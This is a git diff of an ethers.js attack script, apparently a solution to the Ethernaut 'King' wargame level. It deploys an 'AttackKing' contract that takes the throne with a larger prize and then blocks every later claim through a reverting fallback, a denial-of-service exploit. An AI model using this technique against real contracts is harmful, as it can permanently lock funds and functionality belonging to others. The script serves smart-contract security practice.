@@ -1,7 +1,5 @@
+const BigNumber = require("bignumber.js") // Import the BigNumber library
 require("dotenv").config()
-const {
-  abi: ABIAttackKing,
-} = require("../../artifacts/contracts/9/King.sol/AttackKing.json")
 const {
   abi: ABIKing,
 } = require("../../artifacts/contracts/9/King.sol/King.json")
@@ -12,8 +10,10 @@ const provider = new ethers.providers.JsonRpcProvider(_provider)
 const signer = new ethers.Wallet(privateKey, provider)
 
 /* DEPLOY + ATTACK */
+/* @remind calculamos el "prize", deployeamos y enviamos ether al mismo tiempo al "AttackKing", llamamos la funcion que enviara ether con msg.data VACIO,
+    para que el recieve del SM King sea ejecutado */
 async function main() {
-  /* CONTRACT NAME */
+  /* CONTRACT  */
   const contractAddressToHack = "0xa363316cb597E9FC0A9DbD26d201E888fc82F06e"
 
   /* delegation instance */
@@ -22,21 +22,22 @@ async function main() {
     ABIKing,
     provider
   )
-  /* delegation instance */
-  const AttackKingContract = new ethers.Contract(
-    contractAddressToHack,
-    ABIAttackKing,
-    provider
-  )
 
   /* set bigger prize */
   const price = await KingContract.prize()
-  const newPrize = Number(price + 100).toString(10)
-  console.log("newPrize", newPrize)
+  const newPrize = price.add(100) // in wei
+  console.log("newPrize", typeof newPrize, newPrize)
+
+  /* ATTACK CONTRACT NAME */
+  const contractToDeploy = "AttackKing"
+  const MyContract = await ethers.getContractFactory(contractToDeploy)
+  const AttackKingContract = await MyContract.deploy({
+    value: newPrize,
+  })
 
   /* become king - break contrat (always will revert when someone tries to become new king -> case, current king fallback will revert tx) */
   const tx = await AttackKingContract.connect(signer).setKingAttack({
-    value: newPrize,
+    gasLimit: 10000000,
   })
 
   const res = await tx.wait()
